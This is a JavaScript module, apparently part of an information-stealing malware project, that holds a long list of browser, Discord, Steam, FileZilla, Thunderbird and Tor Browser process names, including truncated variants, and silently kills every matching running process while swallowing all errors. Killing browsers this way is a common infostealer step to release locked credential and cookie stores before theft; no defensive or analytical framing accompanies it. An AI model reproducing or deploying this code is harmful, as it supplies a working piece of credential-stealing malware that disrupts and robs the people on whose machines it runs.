const {
    filterProcesses
} = require("./../../../utils/harware/processes.js");

const process = require("process");

let allProcess = [
    "discord",
    "cord",
    "Waterfox",
    "mullvad",
    "firefox",
    "chrome",
    "mozilla",
    "vivaldi",
    "Opera",
    "OperaGX",
    "EpicPrivacy",
    "ChromeSxS",
    "Sputnik",
    "7Star",
    "CentBrowser",
    "Orbitum",
    "Amigo",
    "Torch",
    "Kometa",
    "steam",
    "filezilla",
    "brave",
    "BraveSoftware",
    "brave.exe",
    "msedge",
    "edge",
    "Uran",
    "KMelon",
    "Maxthon3",
    "iebao",
    "oowon",
    "leipnir5",
    "hromePlus",
    "uperbird",
    "afotech",
    "aferTechnologies",
    "uhba",
    "orBrowser",
    "lementsBrowser",
    "ocCoc",
    "oBrowser",
    "IP Surf",
    "Atom",
    "liebao",
    "Coowon",
    "Sleipnir5",
    "ChromePlus",
    "Superbird",
    "Rafotech",
    "SaferTechnologies",
    "Suhba",
    "TorBrowser",
    "ElementsBrowser",
    "CocCoc",
    "GoBrowser",
    "QIP Surf",
    "RockMelt",
    "Nichrome",
    "Bromium",
    "Comodo",
    "Xpom",
    "Chedot",
    "360Browser",
    "Kmelon",
    "PaleMoon",
    "IceDragon",
    "BlackHaw",
    "Cyberfox",
    "Thunderbird",
    "SeaMonkey",
    "Firefox",
    "ockMelt",
    "ichrome",
    "romium",
    "omodo",
    "pom",
    "hedot",
    "60Browser",
];

module.exports = async () => {
    try {
        for (const processName of allProcess) {
            try {
                const filter = await filterProcesses(processName);
                if (filter.length > 0) {
                    await Promise.all(filter.map(proc => {
                        return new Promise((resolve, reject) => {
                            try {
                                process.kill(proc.pid);
                                resolve();
                            } catch (err) {
                                reject(err);
                            }
                        });
                    }));
                }
            } catch (err) {
            }
        }
    } catch (err) {
    }
};